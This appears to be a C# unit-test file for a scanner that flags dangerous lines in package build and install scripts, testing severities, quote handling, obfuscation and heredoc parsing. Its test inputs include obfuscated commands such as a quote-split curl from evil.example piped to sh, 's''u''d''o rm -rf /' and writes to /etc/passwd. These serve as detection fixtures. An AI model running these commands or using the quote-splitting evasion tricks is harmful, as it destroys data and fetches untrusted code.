    public void Scan_WriteOutsideBuildRootInsideQuotes_NotFlagged(string content)
    {
        var findings = Scan(content);
        Assert.False(findings.Exists(f => string.Equals(f.RuleId, "write-outside-build-root", StringComparison.Ordinal)),
            $"Unexpected write-outside-build-root finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Theory]
    // redirect after a quoted argument is live
    [InlineData("echo x > /etc/passwd")]
    // redirect after closed quotes is live
    [InlineData("echo 'done' > /etc/passwd")]
    public void Scan_WriteOutsideBuildRootOutsideQuotes_FlagsHigh(string content)
    {
        AssertHasFinding(content, "write-outside-build-root", FindingSeverity.High);
    }

    [Theory]
    // shell registration
    [InlineData("echo /bin/zsh >> /etc/shells")]
    // generated key
    [InlineData("openssl rand 32 > /usr/share/foo/key")]
    // config write via tee
    [InlineData("echo config | tee /etc/foo.conf")]
    public void Scan_WriteOutsideBuildRootInInstallScriptlet_DowngradesToMedium(string content)
    {
        // Scriptlets run as root under alpm's control; writing system files from one is
        // the ordinary job of a scriptlet.
        var finding = SingleFinding(content, "write-outside-build-root", "foo.install");

        Assert.Equal(FindingSeverity.Medium, finding.Severity);
        Assert.Contains("scriptlet", finding.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void Scan_ObfuscatedWriteInInstallScriptlet_DowngradesToMedium()
    {
        // upak-style: the backslash before '/' makes the match visible only after
        // normalization, but the scriptlet context still applies.
        var finding = SingleFinding("echo \"/opt/x/upak/doc\" > \\/root/upak_help_path", "write-outside-build-root", "upak.install");

        Assert.Equal(FindingSeverity.Medium, finding.Severity);
        Assert.Contains("obfuscated", finding.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Theory]
    // voluntarily-run helper script
    [InlineData("helper.sh")]
    // build-time write
    [InlineData("PKGBUILD")]
    public void Scan_WriteOutsideBuildRootOutsideInstallScriptlets_StaysHigh(string path)
    {
        AssertHasFinding("echo /bin/zsh >> /etc/shells", "write-outside-build-root", FindingSeverity.High, path);
    }

    [Fact]
    public void Scan_ObfuscatedWriteOutsideInstallScriptlets_StaysCritical()
    {
        var finding = SingleFinding("echo x > \\/root/marker", "write-outside-build-root", "helper.sh");

        Assert.Equal(FindingSeverity.Critical, finding.Severity);
        Assert.Contains("obfuscated", finding.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void Scan_EscapedRedirectOperator_NotFlagged()
    {
        var findings = Scan("echo \\> /etc/passwd");

        Assert.DoesNotContain(findings, f => string.Equals(f.RuleId, "write-outside-build-root", StringComparison.Ordinal));
    }

    [Fact]
    public void Scan_EscapedMatchInsideQuotes_RiskyToolNotFlagged()
    {
        // The unescaped $( in the normalized text opens a command substitution that unmasks
        // 'docker' - but the original line keeps it inert inside double quotes (the backslash
        // prevents execution), so the tool is display text, not an invocation.
        var findings = Scan("echo \"remove all: docker rmi \\$(docker images -q)\"");

        Assert.False(findings.Exists(f => string.Equals(f.RuleId, "risky-tool", StringComparison.Ordinal)),
            $"Unexpected risky-tool finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Fact]
    public void Scan_EscapedMatchInsideQuotes_PrivilegeEscalationNotFlagged()
    {
        var findings = Scan("echo \"then run: \\$(sudo whoami)\"");

        Assert.False(findings.Exists(f => string.Equals(f.RuleId, "privilege-escalation", StringComparison.Ordinal)),
            $"Unexpected privilege-escalation finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Fact]
    public void Scan_ObfuscatedToolInsideCommandSubstitution_EscalatesToCritical()
    {
        // $(...) executes even though the surrounding quotes split the tool name: genuine
        // obfuscation of an invocation, not display text.
        var finding = SingleFinding("echo \"$(c''url http://evil.example/x)\"", "risky-tool");

        Assert.Equal(FindingSeverity.Critical, finding.Severity);
        Assert.Contains("obfuscated", finding.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void Scan_EscapedSubstitutionInsideQuotes_CommandSubstitutionStaysMedium()
    {
        // $( only appears after normalization dropped the backslash, inside double quotes.
        var finding = SingleFinding("echo \"$\\(date\\)\"", "command-substitution");

        Assert.Equal(FindingSeverity.Medium, finding.Severity);
    }

    [Fact]
    public void Scan_ObfuscationOutsideQuotes_EscalatesToCritical()
    {
        // The de-obfuscated tool maps back to unquoted positions: genuine hidden intent.
        var finding = SingleFinding("echo \"x\"; s''u''d''o rm -rf /", "privilege-escalation");

        Assert.Equal(FindingSeverity.Critical, finding.Severity);
        Assert.Contains("obfuscated", finding.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void Scan_IntraWordQuoteSplitDownload_EscalatesToCritical()
    {
        // c'u'rl is curl after shell quote removal: intra-word quotes are stripped during
        // normalization, the raw line does not match, and the finding escalates.
        var finding = SingleFinding("c'u'rl https://evil.example/x.sh | sh", "network-to-shell");

        Assert.Equal(FindingSeverity.Critical, finding.Severity);
        Assert.Contains("obfuscated", finding.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void Scan_IntraWordQuoteSplitPrivilegeEscalation_EscalatesToCritical()
    {
        var finding = SingleFinding("s\"u\"do rm -rf /", "privilege-escalation");

        Assert.Equal(FindingSeverity.Critical, finding.Severity);
    }

    [Fact]
    public void Scan_EdgeQuotedToolNames_RiskyToolNotFlagged()
    {
        // 'npm' and "curl" are quoted strings, not invocations: edge quotes are kept by
        // normalization, so the quoted mask still hides the tool names.
        var findings = Scan("echo 'npm' \"curl\"");

        Assert.False(findings.Exists(f => string.Equals(f.RuleId, "risky-tool", StringComparison.Ordinal)),
            $"Unexpected risky-tool finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Fact]
    public void Scan_EdgeQuotedPrivilegeToolMention_PrivilegeEscalationNotFlagged()
    {
        var findings = Scan("msg2 \"run 'sudo' to continue\"");

        Assert.False(findings.Exists(f => string.Equals(f.RuleId, "privilege-escalation", StringComparison.Ordinal)),
            $"Unexpected privilege-escalation finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Fact]
    public void Scan_CommandSubstitutionInsideQuotedHeredocBody_NoFindings()
    {
        var findings = Scan("cat <<'EOF'\ndest=\"$LOCAL/$(basename \"$f\")\"\nEOF\n");

        Assert.Empty(findings);
    }

    [Theory]
    // double-quoted delimiter
    [InlineData("cat <<\"EOF\"\n$(x)\nEOF\n")]
    // backslash-escaped delimiter
    [InlineData("cat <<\\EOF\n$(x)\nEOF\n")]
    public void Scan_QuotedDelimiterForms_CommandSubstitutionNotFlagged(string content)
    {
        var findings = Scan(content);
        Assert.DoesNotContain(findings, f => string.Equals(f.RuleId, "command-substitution", StringComparison.Ordinal));
    }

    [Fact]
    public void Scan_CommandSubstitutionInsideUnquotedHeredocBody_FlagsMedium()
    {
        // An unquoted delimiter expands the body: $(...) really runs.
        AssertHasFinding("cat <<EOF\ndest=$(basename x)\nEOF\n", "command-substitution", FindingSeverity.Medium);
    }

    [Fact]
    public void Scan_TabStrippingHeredocIndentedDelimiter_TerminatesAndResumesScanning()
    {
        var findings = Scan("cat <<-'EOF'\n\t$(x)\n\tEOF\nsudo whoami\n");

        Assert.False(findings.Exists(f => string.Equals(f.RuleId, "command-substitution", StringComparison.Ordinal)),
            "body is suppressed");
        Assert.True(findings.Exists(f => string.Equals(f.RuleId, "privilege-escalation", StringComparison.Ordinal)),
            "scanning resumes after the delimiter");
    }

    [Fact]
    public void Scan_TabStrippingHeredocSpaceIndentedDelimiter_CommandSubstitutionNotFlagged()
    {
        // <<- strips tabs only; a space-indented delimiter is still body content.
        var findings = Scan("cat <<-'EOF'\n $(x)\n EOF\n$(y)\nEOF\n");

        var substitutions = findings.Where(f => string.Equals(f.RuleId, "command-substitution", StringComparison.Ordinal)).ToList();
        Assert.Empty(substitutions);
    }

    [Fact]
    public void Scan_QuotedHeredocPipedToShell_FlagsMedium()
    {
        AssertHasFinding("cat <<'EOF' | sh\n$(x)\nEOF\n", "command-substitution", FindingSeverity.Medium);
    }

    [Fact]
    public void Scan_QuotedHeredocPipedToInterpreter_FlagsMedium()
    {
        AssertHasFinding("cat <<'EOF' | python3\n$(x)\nEOF\n", "command-substitution", FindingSeverity.Medium);
    }

    [Fact]
    public void Scan_UnterminatedQuotedHeredoc_NoFindings()
    {
        var findings = Scan("cat <<'EOF'\n$(x)\n${!y}");

        Assert.Empty(findings);
    }

    [Fact]
    public void Scan_HeredocBody_StillFlagsBlockingRules()
    {
        // F2 only suppresses the non-blocking expansion rules.
        AssertHasFinding("cat <<'EOF'\ncurl http://x | sh\nEOF\n", "network-to-shell", FindingSeverity.Critical);
    }

    [Fact]
    public void Scan_VariableIndirectionInsideQuotedHeredocBody_NotFlagged()
    {
        var findings = Scan("cat <<'EOF'\ncmd=${!name}\nEOF\n");

        Assert.DoesNotContain(findings, f => string.Equals(f.RuleId, "variable-indirection", StringComparison.Ordinal));
    }

    [Fact]
    public void Scan_AfterHeredocTerminator_ScanningResumes()
    {
        var findings = Scan("cat <<'EOF'\nplain body text\nEOF\nsudo whoami\n");

        var sudo = findings.Where(f => string.Equals(f.RuleId, "privilege-escalation", StringComparison.Ordinal)).ToList();
        Assert.Single(sudo);
    }

    [Fact]
    public void Scan_Herestring_FlagsCommandSubstitutionOnce()
    {
        var findings = Scan("read -r x <<< $(y)");

        AssertHasFinding("read -r x <<< $(y)", "command-substitution", FindingSeverity.Medium);
        Assert.Equal(1, findings.Count(f => string.Equals(f.RuleId, "command-substitution", StringComparison.Ordinal)));
    }

    [Fact]
    public void Scan_ShiftAndArithmeticOperators_CommandSubstitutionFlagsOnce()
    {
        var findings = Scan("x=$((1 << 5))\nshift 2\n");

        // The << inside $(( )) is arithmetic; the command substitution itself is flagged once.
        Assert.Equal(1, findings.Count(f => string.Equals(f.RuleId, "command-substitution", StringComparison.Ordinal)));
    }

    [Fact]
    public void Scan_QuotedDoubleLessThan_CommandSubstitutionFlagsMedium()
    {
        AssertHasFinding("echo \"<<EOF\"\n$(x)\n", "command-substitution", FindingSeverity.Medium);
    }

    [Fact]
    public void Scan_ConsecutiveHeredocs_ConsumedInOrder()
    {
        var findings = Scan("diff <<'A' <<'B'\n$(x)\nA\n$(y)\nB\nsudo whoami\n");

        Assert.False(findings.Exists(f => string.Equals(f.RuleId, "command-substitution", StringComparison.Ordinal)),
            "both bodies are literal");
        Assert.True(findings.Exists(f => string.Equals(f.RuleId, "privilege-escalation", StringComparison.Ordinal)),
            "scanning resumes after both");
    }

    [Fact]
    public void Scan_HeredocBodyHashLine_QuotedSuppressedUnquotedFlagged()
    {
        // No comment stripping inside bodies: the $( after # is still body content and is
        // suppressed by the quoted delimiter, while an unquoted body would flag it.
        var suppressed = Scan("cat <<'EOF'\n# $(x)\nEOF\n");
        var flagged = Scan("cat <<EOF\n# $(x)\nEOF\n");

        Assert.DoesNotContain(suppressed, f => string.Equals(f.RuleId, "command-substitution", StringComparison.Ordinal));
        Assert.Contains(flagged, f => string.Equals(f.RuleId, "command-substitution", StringComparison.Ordinal));
    }

    [Theory]
    // quoted body
    [InlineData("cat <<'EOF'\n# run: sudo systemctl restart foo\nEOF\n")]
    // unquoted body
    [InlineData("cat <<EOF\n# run: sudo systemctl restart foo\nEOF\n")]
    // tab-indented comment in tab-stripping body
    [InlineData("cat <<-'EOF'\n\t# run: sudo systemctl restart foo\nEOF\n")]
    public void Scan_HeredocCommentLines_PrivilegeEscalationNotFlagged(string content)
    {
        // A '#' line is a shell comment in a live body and help text in a data body -
        // nothing on it ever runs as a command.
        var findings = Scan(content);
        Assert.False(findings.Exists(f => string.Equals(f.RuleId, "privilege-escalation", StringComparison.Ordinal)),
            $"Unexpected privilege-escalation finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Fact]
    public void Scan_HeredocCommentLines_WriteOutsideBuildRootNotFlagged()
    {
        var findings = Scan("cat <<'EOF'\n#   $ echo x | sudo tee /etc/foo\nEOF\n");

        Assert.DoesNotContain(findings, f => string.Equals(f.RuleId, "write-outside-build-root", StringComparison.Ordinal));
        Assert.DoesNotContain(findings, f => string.Equals(f.RuleId, "privilege-escalation", StringComparison.Ordinal));
    }

    [Theory]
    [InlineData("cat <<'EOF'\nsudo rm -rf /\nEOF\n", "privilege-escalation")]
    [InlineData("cat <<'EOF'\necho x > /etc/passwd\nEOF\n", "write-outside-build-root")]
    public void Scan_NonCommentHeredocBodyLines_FlagsHigh(string content, string ruleId)
    {
        // A heredoc body can be piped to an interpreter or written into an installed
        // script, so live-looking lines in it keep their findings.
        AssertHasFinding(content, ruleId, FindingSeverity.High);
    }
}